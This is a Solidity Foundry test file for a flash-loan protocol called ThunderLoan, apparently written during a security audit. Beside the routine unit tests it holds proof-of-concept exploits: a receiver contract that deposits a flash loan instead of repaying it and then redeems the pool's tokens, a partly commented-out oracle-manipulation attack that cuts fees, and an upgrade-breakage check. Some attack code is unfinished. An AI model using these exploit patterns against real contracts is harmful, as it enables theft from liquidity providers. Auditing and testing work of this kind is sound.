// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    function test_LiquidatorCanRedeem() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        uint256 liquidatorBalanceBeforeDeposit = tokenA.balanceOf(liquidityProvider);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        uint256 liquidatorBalanceAfterDeposit = asset.balanceOf(liquidityProvider);

        // redeem
        // since the liquidator is redeeming, the liquidator balance of this `tokenA` should be greater than or equal to
        // the previous balance
        // the reason it can be greater is because of echange rate

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, AMOUNT);
        vm.stopPrank();

        uint256 liquidatorBalanceAfterRedeem = tokenA.balanceOf(liquidityProvider);

        console2.log("liquidatorBalanceBeforeDeposit", liquidatorBalanceBeforeDeposit);
        console2.log("liquidatorBalanceAfterDeposit ", liquidatorBalanceAfterDeposit);
        console2.log("liquidatorBalanceAfterRedeem  ", liquidatorBalanceAfterRedeem);

        // when a liquidator is calling redeem
        // the liquidator should be able to withdraw the deposit
        // but when the liquidator is depositing the token, `fee` is calculated and `updateExchangeRate` is called
        // which increases the `totalSupply` variable. but the original balance will not go up
        // because no one didn't take any flash loan and paid a fees
        // Even if someone took out a flash loan and paid the fees
        // still `totalSupply` value and `totalBalance` will not match
        // all because of updating excahnge rate during deposit
        // this will disrupt the protocol
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function test_LiquidatorCanRedeem_AfterFlashLoan() public setAllowedToken {
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);

        uint256 liquidatorBalanceBeforeDeposit = tokenA.balanceOf(liquidityProvider);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        uint256 liquidatorBalanceAfterDeposit = asset.balanceOf(liquidityProvider);

        // flashloan
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        // we are minting the `mockFlashLoanReceiver` will the `calculatedFee`
        // so that it can pay the fees
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // redeem
        // since the liquidator is redeeming, the liquidator balance of this `tokenA` should be greater than or equal to
        // the previous balance
        // the reason it can be greater is because of echange rate

        uint256 amountToRedeem = type(uint256).max;

        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();

        uint256 liquidatorBalanceAfterRedeem = tokenA.balanceOf(liquidityProvider);

        console2.log("liquidatorBalanceBeforeDeposit", liquidatorBalanceBeforeDeposit);
        console2.log("liquidatorBalanceAfterDeposit ", liquidatorBalanceAfterDeposit);
        console2.log("liquidatorBalanceAfterRedeem  ", liquidatorBalanceAfterRedeem);

        // when a liquidator is calling redeem
        // the liquidator should be able to withdraw the deposit
        // but when the liquidator is depositing the token, `fee` is calculated and `updateExchangeRate` is called
        // which increases the `totalSupply` variable. but the original balance will not go up
        // because no one didn't take any flash loan and paid a fees
        // Even if someone took out a flash loan and paid the fees
        // still `totalSupply` value and `totalBalance` will not match
        // all because of updating excahnge rate during deposit
        // this will disrupt the protocol

        // InitalDeposit by liquidator = 1000e18
        // After someone took out a flash loan
        // fee was accumulated
        // which is 0.3e18
        // total will be (1000e18 + 0.3e18)/1e18(for precision)
        // 1000.3e18

        // but while redeeming, the redeem amount exceeds the totalBalance of assetToken
        // because of the `fee` and `updateExchangeRate` in deposit
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }

    // function test_OracleManipulation_ToIgnoreFees() public {
    //     // 1. Setup Contracts
    //     thunderLoan = new ThunderLoan();
    //     tokenA = new ERC20Mock();
    //     proxy = new ERC1967Proxy(address(thunderLoan), "");

    //     BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
    //     pf.createPool(address(tokenA));

    //     address tswapPool = pf.getPool(address(tokenA));

    //     thunderLoan = ThunderLoan(address(proxy));
    //     thunderLoan.initialize(address(pf));

    //     // Fund tswap
    //     vm.startPrank(liquidityProvider);
    //     tokenA.mint(liquidityProvider, 100e18);
    //     tokenA.approve(address(tswapPool), 100e18);
    //     weth.mint(liquidityProvider, 100e18);
    //     weth.approve(address(tswapPool), 100e18);
    //     BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
    //     vm.stopPrank();

    //     // Set allow token
    //     vm.prank(thunderLoan.owner());
    //     thunderLoan.setAllowedToken(tokenA, true);

    //     // Add liquidity to ThunderLoan
    //     vm.startPrank(liquidityProvider);
    //     tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
    //     tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
    //     thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
    //     vm.stopPrank();

    //     // TSwap has 100 WETH & 100 tokenA
    //     // ThunderLoan has 1,000 tokenA
    //     // If we borrow 50 tokenA -> swap it for WETH (tank the price) -> borrow another 50 tokenA (do something) ->
    //     // repay both
    //     // We pay drastically lower fees

    //     // here is how much we'd pay normally
    //     uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(tokenA, 100e18);
    //     console2.log("calculatedFeeNormal", calculatedFeeNormal);
    //     // 296147410319118389

    //     uint256 amountToBorrow = 50e18;
    //     MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
    //         address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
    //     );

    //     vm.startPrank(user);
    //     tokenA.mint(address(flr), 100e18);
    //     thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
    //     vm.stopPrank();

    //     uint256 attackFee = flr.feeOne() + flr.feeTwo();
    //     console2.log("Attack fee is: ", attackFee);
    //     assert(attackFee < calculatedFeeNormal);
    // }

    function test_UseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));

        tokenA.mint(address(dor), fee);

        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();

        vm.stopPrank();

        assertGt(tokenA.balanceOf(address(dor)), 50e18 + fee);
    }

    function test_UpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console2.log("Fee Before: ", feeBeforeUpgrade);
        console2.log("Fee After: ", feeAfterUpgrade);

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }

    function testOracleManipulation() public {
        // 1. Setup Contracts!
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        // use weth from baseTest

        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create a TSwap Dex between WETH / Token A
        address tswapPool = pf.createPool(address(tokenA));

        // we are going to use proxy address as the thunder loan contract
        thunderLoan = ThunderLoan(address(proxy));

        // initialize
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        // To fund the TSwap
        // we have to mint the liquidator USDC and tokenA
        vm.startPrank(liquidityProvider);

        tokenA.mint(address(liquidityProvider), 100e18);
        tokenA.approve(address(tswapPool), 100e18);

        weth.mint(address(liquidityProvider), 100e18);
        weth.approve(address(tswapPool), 100e18);

        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        // Ratio 100 WETH & 100 TokenA
        // meaning ratio is `1:1`

        vm.stopPrank();

        // 2. Deposit tokens to the thunder Loan protocol
        // To deposit tokens to, the token has to be allowed
        thunderLoan.setAllowedToken(tokenA, true);

        // let's deposit
        vm.startPrank(liquidityProvider);

        tokenA.mint(address(liquidityProvider), 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);

        //deposit
        thunderLoan.deposit(tokenA, 1000e18);

        vm.stopPrank();

        // 100 WETH & 100 TokenA in TSwap
        // 1000 TokenA in ThunderLoan

        // 3. We are going to take 2 flash loans
        //      a. To nuke the price of WETH/tokenA on TSwap
        //      b. To show that doing so, greatly reduces the fees we pay on thunderloan

        // let's take the first flashLoan
        // Take out a flash loan of 50 tokenA
        // swap it on the DEX, tanking the price
        // let's say user swapped 50 token A for 20 WETH
        // Now the pool will contain `150 tokenA` and `80 WETH`

        // Let's take another flash loan of 50 tokenA
        // when we are taking the second flash loan
        // fee will be calculated based on the TSwap oracle which the user already manipulated
        // therfore the user will take out the flash for very cheap `fee`
        // Due to this oracle manipulation
        // the liquidity providers will get very less interest in return
        // which will disrupt the protocol

        // let's take the first flash loan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("Normal fee is", normalFeeCost); // 0.296147410319118389

        uint256 amountToBorrow = 50e18;
        // thunderLoan.flashloan();
    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    // 1. Swap tokenA borrowed for WETH
    // 2. Take out Another flash loan, to show the difference in fee
    ThunderLoan thunderLoan;
    BuffMockTSwap tswapPool;
    address repayAddress;
    bool attacked;
    uint256 feeOne;
    uint256 feeTwo;

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    // this is the function which will perform all the malicious operations
    // 1. Swap tokenA borrowed for WETH
    // 2. Take out Another flash loan, to show the difference in fee
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        if (!attacked) {
            // 1. Swap tokenA borrowed for WETH
            // 2. Take out Another flash loan, to show the difference in fee

            feeOne = fee;
            attacked = true;
        } else {
            // calculate the fee and repay
        }
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*params*/
    )
        external
        returns (bool)
    {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        s_token.approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}

// contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
//     ThunderLoan thunderLoan;
//     address repayAddress;
//     BuffMockTSwap tswapPool;
//     bool attacked;
//     uint256 public feeOne;
//     uint256 public feeTwo;

//     constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
//         tswapPool = BuffMockTSwap(_tswapPool);
//         thunderLoan = ThunderLoan(_thunderLoan);
//         repayAddress = _repayAddress;
//     }

//     function executeOperation(
//         address token,
//         uint256 amount,
//         uint256 fee,
//         address, /*initiator*/
//         bytes calldata /*params*/
//     )
//         external
//         returns (bool)
//     {
//         if (!attacked) {
//             // 1. Swap tokenA borrowed for WETH
//             // 2. Take out ANOTHER flash loan, to show the difference
//             feeOne = fee;
//             attacked = true;
//             uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
//             IERC20(token).approve(address(tswapPool), 50e18);
//             // Tanks the price
//             tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

//             // we call a second flash loan
//             thunderLoan.flashloan(address(this), IERC20(token), amount, "");
//             // repay
//             // IERC20(token).approve(address(thunderLoan), amount + fee);
//             // thunderLoan.repay(IERC20(token), amount + fee);
//             IERC20(token).transfer(address(repayAddress), amount + fee);
//         } else {
//             feeTwo = fee;
//             // repay
//             // IERC20(token).approve(address(thunderLoan), amount + fee);
//             // thunderLoan.repay(IERC20(token), amount + fee);

//             IERC20(token).transfer(address(repayAddress), amount + fee);
//         }

//         return true;
//     }
// }
